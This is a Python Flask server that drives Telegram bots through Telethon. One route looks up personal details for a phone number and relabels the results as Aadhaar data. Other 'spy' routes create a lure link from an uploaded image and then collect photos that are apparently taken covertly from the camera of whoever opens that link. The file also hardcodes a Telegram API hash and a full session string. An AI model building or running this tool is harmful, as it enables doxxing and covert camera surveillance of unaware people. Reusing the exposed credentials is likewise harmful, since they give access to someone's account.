from flask import Flask, request, jsonify, render_template
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from flask_cors import CORS
import asyncio
import re
import io
import base64

# --- DETAILS ---
api_id = 39183854
api_hash = '7f8b6bfb1b72cab65e44c6cc450cd8f8'

# BOTS
WHOSIM_BOT = '@whosim_bot'
CAMERA_BOT = '@MAXXSPY_BOT'

# Tumhari Generated String
session_string = '1BVtsOMQBuyNf34N8jj1kcjrHqHem9QC84Y-E3XG3yKPDTw7IcRqB2z8Wu5wc7uKDhLu9VB3QEfWEq7fdvKbK9OEeXav1okTF9lBUoifjF5xgs3pnTJf_DWKn_6lN8Awe-vXAU61brJdhlflxS7fjuAsf-XeMsi_9VC_-2sO43EjDtkklq1R3Il-MDthTTnOs5WyOnsAs3Fc-ddsutS6vd_z7Xxv_WRmke9SbcczQVGTL2N6sC35w6bsc8y_8sO-ActGQp57k8w3OB51HjScQN9P8NWkEclaJ976Y0gySocyTw7A9mDe2sad_w96AZWoemwb9nwL1-lFh_b-183IvIbo-WoCoVSw='

app = Flask(__name__, template_folder='.')
CORS(app)

# Async Loop Setup
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)
client = TelegramClient(StringSession(session_string), api_id, api_hash, loop=loop)

# Global var for Camera Spy
last_photo_id = 0

# --- 1. MOBILE INFO LOGIC (EXACTLY YOUR CODE) ---
def clean_and_format_text(text):
    if not text: return ""
    text = text.replace("MAXX", "FAIZAN AZIZI")
    text = re.sub(r'\bID\b', 'Aadhaar Number', text, flags=re.IGNORECASE)
    text = re.sub(r'\bid\b', 'Aadhaar Number', text, flags=re.IGNORECASE)
    return text

async def ask_telegram_final(mobile_number):
    try:
        if not client.is_connected(): await client.connect()
        await client.send_message(WHOSIM_BOT, mobile_number)
        
        for i in range(30):
            await asyncio.sleep(1) 
            history = await client.get_messages(WHOSIM_BOT, limit=1)
            if history:
                msg = history[0]
                content = msg.message or msg.caption or ""
                if not msg.out:
                    if "Results" in content or "Name" in content or "Mobile" in content:
                        return clean_and_format_text(content)
                    if len(content) > 15 and "Search" not in content and "Wait" not in content:
                        return clean_and_format_text(content)
        return "Timeout: Data not found or Bot is slow."
    except Exception as e:
        return f"System Error: {str(e)}"

# --- 2. CAMERA SPY LOGIC (NEW FEATURE) ---
async def start_camera_session():
    try:
        if not client.is_connected(): await client.connect()
        await client.send_message(CAMERA_BOT, "/start")
        await asyncio.sleep(2)
        
        # Click "Camera Mode" button automatically
        async for message in client.iter_messages(CAMERA_BOT, limit=3):
            if message.buttons:
                for row in message.buttons:
                    for button in row:
                        if "camera" in button.text.lower():
                            await button.click()
                            break
        
        # Wait for Session Created Msg
        for i in range(10):
            await asyncio.sleep(1)
            history = await client.get_messages(CAMERA_BOT, limit=1)
            if history:
                msg = history[0]
                if "Session" in msg.text and "created" in msg.text:
                    return msg.text
        return "Failed to start session automatically. Try again."
    except Exception as e:
        return str(e)

async def upload_camera_image(file_bytes):
    global last_photo_id
    try:
        if not client.is_connected(): await client.connect()
        
        history = await client.get_messages(CAMERA_BOT, limit=1)
        if history: last_photo_id = history[0].id
        
        # --- FIX: Force Image Mime Type ---
        f = io.BytesIO(file_bytes)
        f.name = "image.jpg" # This forces Telegram to send as PHOTO
        
        await client.send_file(CAMERA_BOT, f, force_document=False)
        
        # Wait for Link
        for i in range(15):
            await asyncio.sleep(1)
            history = await client.get_messages(CAMERA_BOT, limit=3)
            for msg in history:
                if msg.id > last_photo_id and ("http" in msg.text):
                    last_photo_id = msg.id 
                    # Extract just the link if needed, or return full text
                    return msg.text 
        return "Link not received yet."
    except Exception as e:
        return str(e)

async def check_new_photos():
    global last_photo_id
    new_photos = []
    try:
        if not client.is_connected(): await client.connect()
        # Fetch new messages
        messages = await client.get_messages(CAMERA_BOT, min_id=last_photo_id, limit=20)
        
        for msg in messages:
            if msg.photo:
                blob = await client.download_media(msg.photo, file=bytes)
                b64 = base64.b64encode(blob).decode('utf-8')
                new_photos.append(b64)
                if msg.id > last_photo_id: last_photo_id = msg.id
        
        return new_photos
    except Exception as e:
        return []

# --- ROUTES ---
@app.route('/')
def home():
    return render_template('index.html')

# Mobile Info Route (Unchanged)
@app.route('/get-info', methods=['POST'])
def get_info():
    data = request.json
    mobile_number = data.get('number')
    if not mobile_number: return jsonify({'error': 'No Number'}), 400
    try:
        result = client.loop.run_until_complete(ask_telegram_final(mobile_number))
        return jsonify({'details': result})
    except Exception as e:
        print(f"ERROR: {e}")
        return jsonify({'error': str(e)}), 500

# Camera Spy Routes
@app.route('/spy-start', methods=['POST'])
def spy_start():
    try:
        msg = client.loop.run_until_complete(start_camera_session())
        return jsonify({'message': msg})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/spy-upload', methods=['POST'])
def spy_upload():
    if 'file' not in request.files: return jsonify({'error': 'No file'})
    file = request.files['file']
    try:
        file_bytes = file.read()
        link_msg = client.loop.run_until_complete(upload_camera_image(file_bytes))
        return jsonify({'link': link_msg})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/spy-check', methods=['POST'])
def spy_check():
    try:
        photos = client.loop.run_until_complete(check_new_photos())
        return jsonify({'photos': photos})
    except Exception as e:
        return jsonify({'error': str(e)})

if __name__ == '__main__':
    print("Starting Server...")
    client.start()
    app.run(host='0.0.0.0', port=10000)
